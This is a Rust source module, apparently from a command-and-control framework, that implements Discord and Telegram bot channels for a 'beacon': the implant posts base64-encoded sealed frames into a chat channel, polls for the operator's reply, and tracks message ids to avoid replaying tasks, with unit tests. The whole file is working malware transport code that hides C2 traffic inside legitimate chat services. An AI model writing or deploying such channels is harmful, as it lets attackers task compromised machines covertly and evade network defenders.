//! Chat-platform C2 channels (Discord, Telegram).
//!
//! These differ from the request/reply transports: the beacon *posts* its
//! sealed frame into a chat channel and then *polls* that channel for the
//! operator's reply. The sealed frame rides as base64 in the message body, so
//! the channel carries opaque ciphertext exactly like every other transport.
//!
//! Endpoint forms carry the bot token and the channel address:
//!
//! ```text
//! discord://<bot_token>@<channel_id>
//! telegram://<bot_token>@<chat_id>
//! ```
//!
//! The API base URL is overridable via `NW_DISCORD_API` / `NW_TELEGRAM_API` so
//! the client can be pointed at a local mock in tests instead of the live
//! service.
//!
//! ponytail: one-shot exchange, no long-poll keepalive or message correlation
//! beyond "skip my own message, take the newest other one". That is enough for
//! a beacon that sends one request and waits for one reply per interval.

use base64::Engine;
use std::sync::Mutex;

/// Encode a sealed frame for a message body.
pub fn encode_frame(sealed: &[u8]) -> String {
    base64::engine::general_purpose::STANDARD.encode(sealed)
}

/// Decode a message body back into a sealed frame.
pub fn decode_frame(body: &str) -> Option<Vec<u8>> {
    let trimmed = body.trim();
    if trimmed.is_empty() {
        return None;
    }
    base64::engine::general_purpose::STANDARD
        .decode(trimmed)
        .ok()
}

/// Tracks the newest message id the beacon has seen, so polling never replays
/// old traffic and the beacon's own posts are skipped.
#[derive(Debug, Default)]
pub struct Cursor {
    /// High-water mark: the newest id already consumed.
    ///
    /// Chat platforms number messages monotonically (Discord snowflakes,
    /// Telegram message ids), so a single mark is enough to ignore an entire
    /// backlog. Remembering only the *last* id would re-accept every earlier
    /// message whenever a poll returned more than one, re-running tasks the C2
    /// had already answered.
    seen: Mutex<Option<u64>>,
    /// Message id posted by this beacon's most recent request.
    own: Mutex<Option<String>>,
}

/// Parse a platform message id for ordering. Non-numeric ids fall back to
/// `None`, which disables the high-water mark rather than guessing an order.
fn id_rank(id: &str) -> Option<u64> {
    id.trim().parse().ok()
}

impl Cursor {
    pub fn new() -> Self {
        Self::default()
    }

    /// Record a message id the beacon just posted.
    pub fn note_own(&self, id: impl Into<String>) {
        *self.own.lock().expect("cursor") = Some(id.into());
    }

    /// Should a polled message be returned as the reply?
    ///
    /// True only for messages newer than the cursor that are not our own post.
    pub fn accept(&self, id: &str, body: &str) -> Option<Vec<u8>> {
        let rank = id_rank(id);
        let mut seen = self.seen.lock().expect("cursor");
        // Anything at or below the high-water mark was already consumed.
        if let (Some(prev), Some(this)) = (*seen, rank)
            && this <= prev
        {
            return None;
        }
        let is_own = self
            .own
            .lock()
            .expect("cursor")
            .as_deref()
            .is_some_and(|own| own == id);
        // Advance the mark regardless so we never re-read this id.
        if rank.is_some_and(|this| seen.is_none_or(|prev| this > prev)) {
            *seen = rank;
        }
        if is_own {
            return None;
        }
        decode_frame(body)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn frames_round_trip_through_base64() {
        let sealed = b"\x00\x01sealed frame\xff".to_vec();
        let body = encode_frame(&sealed);
        assert_eq!(decode_frame(&body).unwrap(), sealed);
        assert!(decode_frame("not base64!!").is_none());
        assert!(decode_frame("   ").is_none());
    }

    #[test]
    fn cursor_skips_own_message_and_older_ids() {
        let cursor = Cursor::new();
        cursor.note_own("10");
        // Our own post is ignored.
        assert!(cursor.accept("10", &encode_frame(b"mine")).is_none());
        // A fresh, non-own message is accepted as the reply.
        let reply = cursor.accept("11", &encode_frame(b"reply"));
        assert_eq!(reply.unwrap(), b"reply".to_vec());
        // Re-reading the same id yields nothing.
        assert!(cursor.accept("11", &encode_frame(b"reply")).is_none());
    }

    /// A poll that returns a backlog must not re-consume earlier frames.
    /// Remembering only the newest id would re-accept every older one and make
    /// the C2 re-run tasks it had already answered.
    #[test]
    fn a_backlog_is_consumed_once_in_order() {
        let cursor = Cursor::new();
        assert!(cursor.accept("10", &encode_frame(b"a")).is_some());
        assert!(cursor.accept("11", &encode_frame(b"b")).is_some());
        assert!(cursor.accept("12", &encode_frame(b"c")).is_some());
        // Re-polling the same window must yield nothing.
        for id in ["10", "11", "12"] {
            assert!(
                cursor.accept(id, &encode_frame(b"x")).is_none(),
                "{id} replayed"
            );
        }
    }

    /// Out-of-order arrival still works: a message newer than the mark is
    /// accepted even if an older one is re-delivered afterwards.
    #[test]
    fn an_out_of_order_older_message_is_ignored() {
        let cursor = Cursor::new();
        assert!(cursor.accept("20", &encode_frame(b"new")).is_some());
        assert!(cursor.accept("19", &encode_frame(b"old")).is_none());
    }

    #[test]
    fn cursor_rejects_non_base64_bodies() {
        let cursor = Cursor::new();
        assert!(cursor.accept("1", "operator chatter").is_none());
    }
}
